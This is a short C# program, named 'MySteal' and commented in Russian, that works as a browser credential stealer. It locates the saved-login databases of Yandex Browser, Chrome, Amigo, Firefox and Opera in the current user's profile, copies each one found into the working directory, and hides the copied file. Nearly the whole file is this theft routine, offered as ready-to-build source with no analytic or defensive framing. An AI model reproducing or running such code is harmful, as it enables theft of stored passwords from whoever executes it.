using System;
using System.Collections.Generic;
using System.IO;
namespace MySteal
{
    class Program
    {
        static void Main(string[] args)
        {

            List<string> ListBrowsers = new List<string>();     // Коллекция путей к браузерам
            string UserNamePC = Environment.UserName;           // Получение имени (профиля/пользователя) компьютера
            string NamePC = Environment.MachineName;            // Получение имени компьютера
            ListBrowsers.Add(Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data"));   // Добавление пути Яндекс Браузера
            ListBrowsers.Add(Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Google\Chrome\User Data\Default\Login Data"));          // Добавление пути Гугл Хрома Браузера
            ListBrowsers.Add(Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Amigo\User Data\Default\Login Data"));                  // Добавление пути Амиго Бразуера 
            ListBrowsers.Add(Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Local\Mozilla\Firefox\Profiles\Login Data"));                 // Добавление пути Мозила Бразуера 
            ListBrowsers.Add(Path.GetFullPath($@"C:\Users\{UserNamePC}\AppData\Opera Software\Opera Stable\Login Data"));                    // Добавление пути Опера Бразуера 

            foreach (var path in ListBrowsers)                  // цикл перебора путей браузеров
            {
                if (File.Exists(path))                          // если файл существует
                    File.Copy(path, $@"{Directory.GetCurrentDirectory()}\{UserNamePC} LoginData", true);                    // копирование файлов в текущую директорию
            }

            for (int i = 0; i < ListBrowsers.Count; i++)
            {
                try
                {
                    FileAttributes attributes = File.GetAttributes($@"{Directory.GetCurrentDirectory()}\{UserNamePC} LoginData");   // получение аттрибутов нашего файла
                    if (attributes != FileAttributes.Hidden)
                        File.SetAttributes($@"{Directory.GetCurrentDirectory()}\{UserNamePC} LoginData", FileAttributes.Hidden);    // делаем файл скрытым
                }
                catch (Exception)
                {
                    continue;
                }
            }
        }
    }
}